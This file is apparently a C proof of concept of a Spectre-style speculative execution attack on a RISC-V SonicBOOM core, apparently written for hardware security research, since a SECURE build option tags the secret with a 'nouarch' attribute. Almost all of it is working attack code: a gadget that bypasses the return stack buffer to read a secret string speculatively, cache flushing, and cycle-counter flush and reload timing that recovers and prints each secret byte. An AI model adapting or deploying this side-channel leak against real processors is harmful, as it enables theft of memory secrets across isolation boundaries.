#include <stdio.h>
#include <stdint.h> 
#include "cache.h"

#ifdef SECURE
#include "../context/context.h"
#endif

#define TRAIN_TIMES 30 // emperically chosen value for successful mistraining
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 200 // amount of times to attack the same index
#define SECRET_SZ 23
#define CACHE_HIT_THRESHOLD 50

//#define CACHE_FLUSH_ITERATIONS 2048
//#define CACHE_FLUSH_STRIDE 4096
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096

#define ARRAY_STRIDE L1_BLOCK_SZ_BYTES

uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];


uint8_t unused1[64];
uint8_t unused2[64];
uint8_t attackArray[256 * ARRAY_STRIDE];
#ifdef SECURE
char nouarch secretString[25] = "!\"#SecretInTheSonicBOOM";
#else
char secretString[25] = "!\"#SecretInTheSonicBOOM";
#endif

#define write_chickcsr(val) ({ asm volatile ("csrwi 0x8c1, %0" :: "rK"(val)); })

#define read_csr(reg) ({ unsigned long __tmp; \
  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
  __tmp; })


uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

//uint8_t temp = 0; /* Used so compiler won�t optimize out victim_function() */

/**
 * function to read in the attack array given an attack address to read in. it does this speculatively by bypassing the RSB
 *
 * @input secaddr passed in address to read from
 */
void specFunc(char *secaddr){
    extern void frameDump();
    uint64_t dummy = 0;
    frameDump();
    asm volatile("mv s0, s6\n");
    //char secret = *addr;
    temp = attackArray[(*((uint8_t*)secaddr)) * ARRAY_STRIDE];
    temp &= attackArray[(*((uint8_t*)secaddr)) * ARRAY_STRIDE];
    //temp &= attackArray[(*((uint8_t*)addr)) * CACHE_FLUSH_STRIDE];
    //temp &= attackArray[25 * CACHE_FLUSH_STRIDE];  
    //dummy = read_csr(cycle);
}

int main(void){
    register uint64_t start, diff; 
    register uint64_t start_ov, diff_ov; 
    uint64_t mix_i;
    unsigned int dummy = 0;
    static uint64_t results[256];
    volatile uint8_t * addr;
    
    int junk2 = 0;
    int l;
    (void)junk2;
        
    //disable OOO
    //write_chickcsr(0x8);
    //disable TTP
    //write_chickcsr(0x00);
	
    for (int i = 0; i < (int)sizeof(cache_flush_array); i++) {
      cache_flush_array[i] = 1;
    }
    
    
    for (int i = 0; i < (int)sizeof(attackArray); i++) {
      attackArray[i] = 1; /* write to attackArray so in RAM not copy-on-write zero pages */
    }  
    
    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset){
        
		start_ov = read_csr(cycle);
        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            //printf("start attack\n");

            // flush the array that will be probed
            
                for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
                  junk2 = cache_flush_array[l];
                }            
				
                /* Delay (act as mfence) */                
                for(volatile int k = 0; k < 100; ++k){
                    asm("");
                }				

            //printf("flushed attackarray\n");

            // run the particular attack sequence
            //temp &= attackArray[*(secretString + offset) * L1_BLOCK_SZ_BYTES];
            specFunc(secretString + offset);         
            //__asm__ volatile ("ld fp, -16(sp)");//Adjust the frame pointer for properly looping over the offset
            // addr = &attackArray[ 66* ARRAY_STRIDE];
            // dummy &= * addr;
            // addr = &attackArray[ 65* ARRAY_STRIDE];
            // dummy &= * addr;
            // addr = &attackArray[ 67* ARRAY_STRIDE];
            // dummy &= * addr;
            // addr = &attackArray[ 117* ARRAY_STRIDE];
            // dummy &= * addr;                                    
            // read out array 2 and see the hit secret value            
            /* Time reads. Order is lightly mixed up to prevent stride prediction */
            for (int i = 0; i < 256; i++) {
                mix_i = ((i * 167) + 13) & 255;
                addr = &attackArray[mix_i * ARRAY_STRIDE];
                //addr = & attackArray[mix_i * CACHE_FLUSH_STRIDE];
                
                /*
                We need to accuratly measure the memory access to the current index of the
                array so we can determine which index was cached by the malicious mispredicted code.
                The best way to do this is to use the read_csr instruction, which measures current
                processor ticks, and is also serialized.
                */                             
                start = read_csr(cycle); /* READ TIMER */
                dummy = * addr; /* MEMORY ACCESS TO TIME */
                diff = (read_csr(cycle) - start); /* READ TIMER & COMPUTE ELAPSED TIME */
                
                if ((uint64_t)diff < CACHE_HIT_THRESHOLD){
                  results[mix_i]++; /* cache hit - add +1 to score for this value */
                }            
            }

            //printf("finished results\n");
        }

        // get highest and second highest result hit values
        results[0] ^= dummy; /* use junk so code above wont get optimized out*/
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

	diff_ov = read_csr(cycle) - start_ov;
	printf("m[0x%p] = offset(%lu) = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(secretString + offset), offset, secretString[offset], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]);
	printf("DIFF OV:%lu\n",diff_ov);	
    }
}
